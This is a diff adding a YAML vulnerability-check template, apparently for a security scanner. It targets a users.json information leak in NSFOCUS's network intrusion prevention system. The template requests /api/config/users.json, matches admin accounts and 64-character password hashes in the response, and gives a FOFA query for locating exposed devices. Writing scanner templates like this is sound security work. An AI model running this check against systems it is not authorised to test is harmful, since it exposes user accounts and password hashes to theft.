@@ -1,0 +1,15 @@
+id: poc-yaml-nsfocus-nips-users-json-info-leak
+info:
+  name: NIPS 绿盟网络入侵防护系统 users.json 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 绿盟网络入侵防护系统
+  fofa: title="NSFOCUS NIDPS"
+requests:
+- method: GET
+  path: /api/config/users.json
+  expression: status_code == 200 && contains(body,"\"admin\":") && contains(body,"\"mail\":")
+    && matches(body,"\"password\":\"([0-9a-z]{64})\"") && !contains(body,"<")
+variables: {}
+transport: http
